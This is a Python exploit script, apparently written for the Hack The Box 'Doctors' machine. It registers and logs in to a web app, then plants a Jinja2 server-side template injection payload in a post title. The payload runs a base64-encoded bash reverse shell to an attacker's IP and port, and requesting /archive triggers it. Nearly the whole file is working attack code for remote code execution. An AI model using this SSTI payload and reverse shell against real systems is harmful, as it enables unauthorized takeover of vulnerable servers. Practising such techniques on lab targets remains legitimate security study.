#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import base64


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)
parser.add_argument("-P", "--password", help="Password", required=True)
parser.add_argument("-U", "--username", help="Username", required=True)


args = parser.parse_args()

s = requests.Session()

def register (target, username, password):

	url = "http://%s/register" % target

	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
		"Origin" : "http://doctors.htb",
		"Referer" : "http://doctors.htb/register",
		"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Connection" : "close"
		}

	data = { "username" : username, "email" : str(username)+"@doctors.htb", "password" : password, "confirm_password" : password, "submit" : str("Sign+Up") }

	#proxies = { "http" : "127.0.0.1:8080" }


	r = s.post(url, headers=headers, data=data)# proxies=proxies)

	#print(r.text)

	if "Your account has been created, with a time limit of twenty minutes!" in r.text:
		print("[INFO] " + str(username) + " was successfully registered!")
	else:
		print("[ERROR] Registration Failed!")
		sys.exit(1)



#login function
def login(target, username, password):
	url = "http://%s/login?next=/home" % target

	data = { "email" : str(username)+"@doctors.htb", "password" : password, "submit" : "Login" }
	#proxies = { "http" : "127.0.0.1:8080" }

	#s = requests.Session()
	r = s.post(url, data=data)# proxies=proxies)

	if "New Message" in r.text:
		print("[INFO] Login using the " + str(username) + " user was successful!")
	else:
		print("[ERROR] Login Failed!")
		sys.exit(1)


def ssti_attack(target, attacker_ip, attacker_port):

	url = "http://%s/post/new" % target

	base64_payload = "bash -i >& /dev/tcp/"+str(attacker_ip)+"/"+str(attacker_port)+" 0>&1"
	encoded_payload = base64.b64encode(base64_payload.encode('ascii')).decode('ascii')

	ssti_rce = "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\"echo  '" + str(encoded_payload) + "' | base64 -d | bash\").read() }}"

	data = { "title" : ssti_rce, "content" : "Lisboa", "submit" : "Post" }
	#proxies = { "http" : "127.0.0.1:8080" }

	#s = requests.Session()
	r = s.post(url, data=data)# proxies=proxies)

	if "Your post has been created!" in r.text:
		print("[INFO] Post was submitted successfully! Visting the /archive page")
	else:
		print("[ERROR] Something went wrong with the post!")
		sys.exit(1)


	print("Check your callback :)")
	archive_page = s.get("http://%s/archive" % target)


def main():
	register(args.target, args.username, args.password)
	login(args.target, args.username, args.password)
	ssti_attack(args.target, args.IP, args.port)


if __name__ == "__main__":
    main()
